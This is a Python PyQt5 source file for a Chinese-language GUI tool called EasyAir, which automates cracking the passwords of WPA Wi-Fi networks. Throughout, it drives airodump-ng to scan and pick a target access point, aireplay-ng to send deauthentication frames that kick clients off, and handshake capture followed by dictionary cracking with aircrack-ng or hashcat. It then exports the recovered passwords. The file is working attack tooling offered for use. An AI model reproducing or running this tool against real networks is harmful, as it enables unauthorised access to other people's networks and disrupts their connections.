#!/usr/bin/env python3
import sys
import re
import time
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMessageBox, QTableWidgetItem, QFileDialog
from PyQt5.QtCore import QThread, pyqtSignal, QTimer

from ui.main_ui import MainUI, WordListDialog
from core.aircore import AirCore


class CmdThread(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, proc):
        super().__init__()
        self.proc = proc
        self._stop = False

    def run(self):
        try:
            if not self.proc:
                return
            for line in self.proc.stdout:
                if self._stop:
                    break
                self.line_out.emit(line.rstrip())
            self.proc.wait()
        except (OSError, ValueError) as e:
            self.line_out.emit(f"[线程错误] {e}")
        finally:
            self.finished.emit()

    def stop(self):
        self._stop = True
        if self.proc:
            try:
                self.proc.terminate()
            except OSError:
                pass


class EasyAirApp(MainUI):
    def __init__(self):
        super().__init__()
        self.core = AirCore(Path(__file__).parent)
        self.scan_thread = None
        self.cap_thread = None
        self.crack_thread = None
        self.conv_thread = None
        self.mon_thread = None
        self.mon_iface = None
        self.physical_iface = None
        self._last_csv = None
        self.auto_monitor_enabled = True

        self.scan_timer = QTimer(self)
        self.scan_timer.timeout.connect(self._parse_scan_csv)
        self.scan_timer.setInterval(1500)

        self.current_crack_item = None
        self.crack_start_time = 0
        self.crack_timer = QTimer(self)
        self.crack_timer.timeout.connect(self._update_crack_timer)
        self.crack_timer.setInterval(1000)

        self._bind()
        self._load_wordlists()
        self._refresh_ifaces()

    def _bind(self):
        self.btn_refresh_iface.clicked.connect(self._refresh_ifaces)
        self.btn_mon_toggle.toggled.connect(self._on_mon_toggle)
        self.btn_scan.clicked.connect(self._start_scan)
        self.btn_stop_scan.clicked.connect(self._stop_scan)
        self.btn_capture.clicked.connect(self._start_capture)
        self.btn_deauth.clicked.connect(self._do_deauth)
        self.btn_dict_mgr.clicked.connect(self._open_dict_manager)
        self.btn_crack_cfg.clicked.connect(self._open_crack_settings)
        self.btn_start_crack.clicked.connect(self._start_crack)
        self.btn_stop_crack.clicked.connect(self._stop_crack)
        self.btn_export.clicked.connect(self._export_results)
        self.ap_table.cellDoubleClicked.connect(self._on_ap_double_clicked)

    def log(self, txt: str):
        self.log_box.append(txt)
        self.log_box.ensureCursorVisible()

    def set_status(self, txt: str):
        self.status_label.setText(txt)

    def _refresh_ifaces(self):
        self.iface_combo.clear()
        for i in self.core.list_interfaces():
            self.iface_combo.addItem(i)
        if self.iface_combo.count() == 0:
            self.log("[提示] 未检测到无线网卡 (iw dev 无输出)")
            self.log("  - 真机: 确认网卡驱动正常")
            self.log("  - 虚拟机: 需将支持监听的 USB 无线网卡直通")

    def _on_mon_toggle(self, checked: bool):
        physical = self.iface_combo.currentText()
        if not physical:
            self.btn_mon_toggle.setChecked(False)
            return

        if checked:
            self.log(f"[手动] 开启监听模式: {physical}")
            self.set_monitor_status("starting")
            p = self.core.start_monitor(physical)
            self.mon_thread = CmdThread(p)
            self.mon_thread.line_out.connect(self.log)
            self.mon_thread.finished.connect(lambda: self._on_mon_started(physical))
            self.mon_thread.start()
            self.physical_iface = physical
        else:
            self._stop_monitor_manual()

    def _on_mon_started(self, physical: str):
        if self.core.check_monitor_mode(physical):
            self.mon_iface = physical
            self.log(f"[就绪] 监听接口: {physical} (原接口直接切换)")
            self.set_monitor_status("on")
            return

        for iface in self.core.list_interfaces():
            if "mon" in iface and physical in iface:
                if self.core.check_monitor_mode(iface):
                    self.mon_iface = iface
                    self.log(f"[就绪] 监听接口: {iface}")
                    self.set_monitor_status("on")
                    return

        self.log("[错误] 监听模式开启失败：未检测到 monitor 接口")
        self.set_monitor_status("error")
        self.btn_mon_toggle.setChecked(False)

    def _stop_monitor_manual(self):
        if self.mon_iface:
            self.log(f"[手动] 关闭监听模式: {self.mon_iface}")
            p = self.core.stop_monitor(self.mon_iface)
            t = CmdThread(p)
            t.line_out.connect(self.log)
            t.finished.connect(self._on_mon_stopped)
            t.start()

    def _on_mon_stopped(self):
        self.mon_iface = None
        self.physical_iface = None
        self.set_monitor_status("off")
        self.btn_mon_toggle.setChecked(False)

    def _load_wordlists(self):
        pass

    def _open_dict_manager(self):
        dlg = WordListDialog(self, self.core.get_wordlists())
        if dlg.exec_() == WordListDialog.Accepted:
            new_lists = dlg.get_wordlists()
            self.core.config["wordlists"] = new_lists
            self.core.save_config()
            self.log(f"[字典] 已更新，共 {len(new_lists)} 个字典文件")

    def _open_crack_settings(self):
        from PyQt5.QtWidgets import QDialog, QVBoxLayout, QFormLayout, QLineEdit, QDialogButtonBox, QCheckBox
        dlg = QDialog(self)
        dlg.setWindowTitle("破解设置")
        dlg.resize(400, 250)
        layout = QVBoxLayout(dlg)
        form = QFormLayout()
        
        extra_args = QLineEdit(self.core.config.get("hashcat_extra_args", ""))
        extra_args.setPlaceholderText("--force --opencl-device-types 1,2")
        form.addRow("Hashcat 额外参数:", extra_args)
        
        auto_mon = QCheckBox("自动监听模式 (推荐)")
        auto_mon.setChecked(self.core.config.get("auto_monitor", True))
        form.addRow(auto_mon)
        
        layout.addLayout(form)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dlg.accept)
        buttons.rejected.connect(dlg.reject)
        layout.addWidget(buttons)
        
        if dlg.exec_() == QDialog.Accepted:
            self.core.set_hashcat_extra_args(extra_args.text())
            self.core.config["auto_monitor"] = auto_mon.isChecked()
            self.core.save_config()
            self.log("[设置] 已保存")

    def _start_scan(self):
        physical = self.iface_combo.currentText()
        if not physical:
            QMessageBox.warning(self, "提示", "请先选择无线网卡")
            return

        self.set_status("正在开启监听模式并扫描...")
        self.log(f"[自动] 开启监听模式: {physical}")
        self.set_monitor_status("starting")
        
        self.physical_iface = physical
        self.mon_thread = CmdThread(self.core.start_monitor(physical))
        self.mon_thread.line_out.connect(self.log)
        self.mon_thread.finished.connect(self._on_mon_ready_for_scan)
        self.mon_thread.start()
        
        self.btn_scan.setEnabled(False)
        self.btn_stop_scan.setEnabled(True)

    def _on_mon_ready_for_scan(self):
        physical = self.physical_iface
        
        if self.core.check_monitor_mode(physical):
            self.mon_iface = physical
            self.log(f"[就绪] 监听接口: {physical} (原接口直接切换)")
            self.set_monitor_status("on")
            self._do_scan()
            return

        for iface in self.core.list_interfaces():
            if "mon" in iface and physical in iface:
                if self.core.check_monitor_mode(iface):
                    self.mon_iface = iface
                    self.log(f"[就绪] 监听接口: {iface}")
                    self.set_monitor_status("on")
                    self._do_scan()
                    return

        self.log("[错误] 监听模式开启失败：未检测到 monitor 接口")
        self.set_monitor_status("error")
        self.btn_scan.setEnabled(True)
        self.btn_stop_scan.setEnabled(False)
        self.set_status("监听模式开启失败")

    def _do_scan(self):
        self.log(f"> 扫描 AP: {self.mon_iface}")
        p = self.core.airodump_scan(self.mon_iface, "scan")
        self.scan_thread = CmdThread(p)
        self.scan_thread.line_out.connect(self.log)
        self.scan_thread.start()
        self.scan_timer.start()
        self.set_scan_status("scanning")
        self.set_status("扫描中... 点击'停止扫描'查看列表")

    def _stop_scan(self):
        if self.scan_thread:
            self.scan_thread.stop()
            self.scan_thread = None
        self.scan_timer.stop()
        self._parse_scan_csv(force=True)
        self._auto_stop_monitor()
        self.btn_scan.setEnabled(True)
        self.btn_stop_scan.setEnabled(False)
        self.set_scan_status("idle")
        self.set_status("扫描已停止")

    def _find_latest_csv(self):
        csvs = list(self.core.caps_dir.glob("scan*.csv"))
        return max(csvs, key=lambda x: x.stat().st_mtime) if csvs else None

    def _parse_scan_csv(self, force=False):
        csv = self._find_latest_csv()
        if not csv or (csv == self._last_csv and not force):
            return
        self._last_csv = csv
        try:
            txt = csv.read_text(errors="ignore")
            ap_sec = txt.split("Station MAC")[0] if "Station MAC" in txt else txt
            rows = []
            for line in ap_sec.splitlines():
                line = line.strip()
                if not line or line.startswith(("BSSID", "Interface")):
                    continue
                parts = re.split(r',\s*', line)
                if len(parts) < 14:
                    continue
                bssid, ch, priv, cipher, auth, pwr = parts[0], parts[3], parts[5], parts[6], parts[7], parts[8]
                essid = ','.join(parts[13:]).strip().strip('"')
                if not bssid:
                    continue
                try:
                    pwr_int = int(pwr)
                    if pwr_int >= -50:
                        sig = "📶📶📶"
                    elif pwr_int >= -70:
                        sig = "📶📶"
                    else:
                        sig = "📶"
                except ValueError:
                    sig = "📶"
                rows.append((sig, essid or "(隐藏)", bssid, ch.strip(), f"{priv}/{cipher}", auth.strip(), pwr))
            if rows:
                self.ap_table.setRowCount(0)
                for r in rows:
                    i = self.ap_table.rowCount()
                    self.ap_table.insertRow(i)
                    for c, v in enumerate(r):
                        self.ap_table.setItem(i, c, QTableWidgetItem(v))
                self.log(f"[解析] 更新 AP 列表: {len(rows)} 个")
                self.set_status(f"发现 {len(rows)} 个 AP - 双击选择目标")
        except (OSError, ValueError, IndexError) as e:
            self.log(f"[解析失败] {e}")

    def _on_ap_double_clicked(self, row, col):
        self._select_target(row)

    def _select_target(self, row):
        if row < 0:
            return
        essid = self.ap_table.item(row, 1).text()
        bssid = self.ap_table.item(row, 2).text()
        ch = self.ap_table.item(row, 3).text()
        enc = self.ap_table.item(row, 4).text()
        
        self.lbl_target_essid.setText(essid)
        self.lbl_target_bssid.setText(bssid)
        self.lbl_target_ch.setText(ch)
        self.lbl_target_enc.setText(enc)
        self.lbl_handshake.setText("未捕获")
        self.lbl_handshake.setStyleSheet("color: #c62828; font-weight: bold;")
        
        self.log(f"[目标] 已选择: {essid} ({bssid}) CH:{ch}")
        self.set_status(f"目标已锁定: {essid} - 点击'抓取握手包'")

    def _start_capture(self):
        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()
        ch = self.lbl_target_ch.text()
        if essid == "未选择" or not bssid:
            QMessageBox.warning(self, "提示", "请先在左侧列表双击选择目标 AP")
            return

        if not self.mon_iface:
            QMessageBox.warning(self, "提示", "监听模式未就绪")
            return

        self.log(f"[抓包] 目标: {essid} | {bssid} | CH:{ch}")
        self.log(f"> airodump-ng --bssid {bssid} --channel {ch} -w captures/handshake {self.mon_iface}")
        p = self.core.airodump_capture(self.mon_iface, bssid, ch, "handshake")
        self.cap_thread = CmdThread(p)
        self.cap_thread.line_out.connect(self.log)
        self.cap_thread.start()
        
        self.cap_check_timer = QTimer(self)
        self.cap_check_timer.timeout.connect(self._check_handshake)
        self.cap_check_timer.setInterval(2000)
        self.cap_check_timer.start()
        
        self.set_status("正在抓取握手包... 可点击 Deauth 加速")

    def _check_handshake(self):
        cap = self.core.get_latest_handshake()
        if cap:
            self.lbl_handshake.setText(f"已捕获: {cap.name}")
            self.lbl_handshake.setStyleSheet("color: #2e7d32; font-weight: bold;")
            self.log(f"[成功] 捕获握手包: {cap}")
            self.set_status(f"握手包已捕获: {cap.name} - 可开始破解")
            if hasattr(self, 'cap_check_timer'):
                self.cap_check_timer.stop()

    def _do_deauth(self):
        bssid = self.lbl_target_bssid.text()
        if not bssid or bssid == "未选择":
            return
        if not self.mon_iface:
            return
        self.log(f"> aireplay-ng --deauth 10 -a {bssid} {self.mon_iface}")
        p = self.core.deauth(self.mon_iface, bssid, 10)
        t = CmdThread(p)
        t.line_out.connect(self.log)
        t.start()

    def _auto_stop_monitor(self):
        if self.auto_monitor_enabled and self.mon_iface:
            self.log("[自动] 关闭监听模式...")
            p = self.core.stop_monitor(self.mon_iface)
            t = CmdThread(p)
            t.line_out.connect(self.log)
            t.finished.connect(lambda: setattr(self, 'mon_iface', None))
            t.start()

    def _start_crack(self):
        cap = self.core.get_latest_handshake()
        if not cap:
            QMessageBox.warning(self, "提示", "未检测到握手包，请先抓取握手包")
            return
        wordlists = self.core.get_wordlists()
        if not wordlists:
            QMessageBox.warning(self, "提示", "请先在'字典管理'中添加字典文件")
            return

        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()
        self.current_crack_item = self.crack_result.add_target(bssid, essid, str(cap))
        
        self.progress_bar.setVisible(True)
        self.lbl_progress.setText("正在启动破解...")
        self.btn_start_crack.setEnabled(False)
        self.btn_stop_crack.setEnabled(True)
        self.crack_start_time = time.time()
        self.crack_timer.start()

        engine = self.crack_engine.currentText()
        if engine == "Aircrack-ng":
            self.log(f"> aircrack-ng '{cap}' -w '{wordlists[0]}'")
            p = self.core.crack_aircrack(str(cap), wordlists[0])
            self.crack_thread = CmdThread(p)
            self.crack_thread.line_out.connect(self._on_crack_output)
            self.crack_thread.finished.connect(self._on_crack_finished)
            self.crack_thread.start()
            self.log("[破解中] Aircrack-ng 正在跑字典...")
        else:
            self._run_hashcat(str(cap), wordlists)

    def _run_hashcat(self, cap, wordlists):
        self.log("[Hashcat] 正在转换 .cap -> .hc22000...")
        pconv = self.core.cap_to_hc22000(cap)
        self.conv_thread = CmdThread(pconv)
        self.conv_thread.line_out.connect(self.log)

        def on_conv_done():
            hc = Path(cap).with_suffix(".hc22000")
            if hc.exists():
                self.log(f"[转换完成] {hc}")
                device_idx = self.device_combo.currentIndex()
                use_gpu = device_idx != 2
                extra = self.core.config.get("hashcat_extra_args", "")
                self.log(f"> hashcat -m 22000 {'-D 1,2' if use_gpu else '-D 1'} {extra} '{hc}' {' '.join(wordlists)}")
                p2 = self.core.crack_hashcat(str(hc), wordlists, use_gpu, extra)
                self.crack_thread = CmdThread(p2)
                self.crack_thread.line_out.connect(self._on_crack_output)
                self.crack_thread.finished.connect(self._on_crack_finished)
                self.crack_thread.start()
                self.log("[破解中] Hashcat 正在跑字典...")
            else:
                self.log("[错误] hcxpcapngtool 转换失败")
                self._on_crack_finished()

        self.conv_thread.finished.connect(on_conv_done)
        self.conv_thread.start()

    def _on_crack_output(self, line):
        self.log(line)
        if "KEY FOUND" in line or "FOUND" in line.upper():
            import re
            match = re.search(r'\[(.*?)\]', line) or re.search(r'KEY FOUND.*?(\S+)', line)
            if match:
                pwd = match.group(1)
                self.crack_result.update_progress(self.current_crack_item, pwd, self._format_elapsed())
                return
            self.crack_result.update_progress(self.current_crack_item, line.strip(), self._format_elapsed())

    def _update_crack_timer(self):
        elapsed = self._format_elapsed()
        self.lbl_progress.setText(f"破解中... 已耗时: {elapsed}")
        if self.current_crack_item:
            self.crack_result.update_progress(self.current_crack_item, None, elapsed)

    def _format_elapsed(self):
        elapsed = int(time.time() - self.crack_start_time)
        h, rem = divmod(elapsed, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _on_crack_finished(self):
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self.btn_start_crack.setEnabled(True)
        self.btn_stop_crack.setEnabled(False)
        
        if self.current_crack_item:
            pwd = self.current_crack_item.text(2)
            if not pwd or pwd == "破解中...":
                self.crack_result.set_failed(self.current_crack_item, "未找到密码")
        
        self.lbl_progress.setText("破解完成")
        self.set_status("破解任务结束")
        self.log("[完成] 破解任务结束")

    def _stop_crack(self):
        if self.crack_thread:
            self.crack_thread.stop()
            self.crack_thread = None
        if self.conv_thread:
            self.conv_thread.stop()
            self.conv_thread = None
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self.btn_start_crack.setEnabled(True)
        self.btn_stop_crack.setEnabled(False)
        if self.current_crack_item:
            self.crack_result.set_failed(self.current_crack_item, "已停止")
        self.log("[已停止] 破解已终止")
        self.set_status("破解已停止")

    def _export_results(self):
        fn, _ = QFileDialog.getSaveFileName(self, "导出结果", str(Path.home() / "easyair_results.csv"), "CSV Files (*.csv)")
        if fn:
            try:
                with open(fn, 'w', encoding='utf-8') as f:
                    f.write("BSSID,ESSID,密码,握手包,状态,耗时\n")
                    for i in range(self.crack_result.topLevelItemCount()):
                        item = self.crack_result.topLevelItem(i)
                        f.write(f"{item.text(0)},{item.text(1)},{item.text(2)},{item.text(3)},{item.text(4)},{item.text(5)}\n")
                QMessageBox.information(self, "成功", f"已导出到: {fn}")
                self.log(f"[导出] 结果已保存到: {fn}")
            except OSError as e:
                QMessageBox.warning(self, "错误", f"导出失败: {e}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = EasyAirApp()
    win.show()
    sys.exit(app.exec())
